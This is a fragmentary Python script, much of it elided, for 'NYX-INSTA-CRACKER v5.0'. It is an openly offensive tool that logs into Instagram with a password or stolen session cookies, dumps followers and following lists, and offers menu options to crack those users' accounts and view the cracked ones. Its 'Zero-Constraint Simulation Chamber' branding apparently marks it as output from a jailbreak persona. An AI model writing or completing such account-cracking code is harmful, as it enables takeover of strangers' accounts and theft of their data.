#!/usr/bin/env python3
"""
NYX-INSTA-CRACKER v5.0 - Username & Password Login
Zero-Constraint Simulation Chamber (ZCSC) Release
Added: Direct login with username and password
...
class InstagramSession:
    ...
    def login_with_credentials(self, username, password):
        ...
        try:
            ...
            resp = self.session.post(login_url, headers=self.headers, json=login_data)
            ...
            if resp.status_code == 200:
                ...
                if 'challenge' in error_msg.lower():
                    print("  [✗] Challenge required - account may need verification")
                    print("  [*] Try logging in through browser first")
    ...
    def parse_cookie_string(self, cookie_string):
        """Parse cookie string with support for URL encoding and special characters"""
        try:
                ...
                try:
                    ...
                    if resp.status_code == 200:
                        try:
                            ...
                            if 'logout' not in resp.text.lower() and 'login' not in resp.text.lower():
...
class NyxMenu:
    ...
    def display_banner(self):
        ...
        print("  ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝")
        print("="*70)
        print("  NYX-INSTA-CRACKER v5.0 - Username/Password Login")
    ...
    def display_menu(self):
        ...
        print("  │  [2] Login with Cookie (Paste String)        │")
        print("  │  [3] Dump Followers                          │")
        print("  │  [4] Dump Following                          │")
        print("  │  [5] Dump Both (Followers + Following)       │")
        print("  │  [6] Start Cracking (Dumped Users)           │")
        print("  │  [7] Show Status                             │")
        print("  │  [8] View Cracked Accounts                   │")
        print("  │  [9] Clear/Reset Session                     │")
        print("  │  [0] Exit                                    │")
        print("  └──────────────────────────────────────────────┘")
    ...
    def login_with_credentials(self):
        ...
        print("  [*] Note: This is for authenticated scraping")
        ...
        if not self.session_obj.login_with_credentials(username, password):
            print("  [✗] Login failed")
            input("\n  [>] Press Enter to continue...")
            return False
    ...
    def login_with_cookie(self):
        ...
        print("\n  [*] Required cookies: csrftoken, sessionid, ds_user_id")
        print("  [*] Example: sessionid=123456; csrftoken=abc123; ds_user_id=123")
        print("\n" + "-"*70)
    ...
    def dump_followers_menu(self):
        if not self.session_obj or not self.session_obj.authenticated:
            print("  [✗] Please login first (Option 1 or 2)")
            input("\n  [>] Press Enter to continue...")
            return
    ...
    def start_cracking_menu(self):
        ...
        if not self.users_dumped:
            print("  [✗] No users dumped. Use Option 3, 4, or 5 first.")
            input("\n  [>] Press Enter to continue...")
            return
